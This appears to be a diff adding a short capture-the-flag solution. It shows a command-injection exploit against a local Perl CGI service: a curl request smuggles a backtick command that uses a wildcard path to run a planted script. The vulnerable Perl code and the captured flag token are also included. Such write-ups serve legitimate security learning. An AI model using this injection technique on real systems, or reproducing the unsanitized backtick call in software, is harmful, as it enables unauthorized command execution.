@@ -1,0 +1,11 @@
+
+echo "getflag > /tmp/flag" > /tmp/TEST1
+chmod +x /tmp/TEST1
+curl "http://localhost:4646?x=\`/*/TEST1\`"
+cat /tmp/flag
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+
+
+$xx =~ tr/a-z/A-Z/; # convert to uppercase
+$xx =~ s/\s.*//; # strip everything after first space
+@output = `egrep "^$xx" /tmp/xd 2>&1`; 
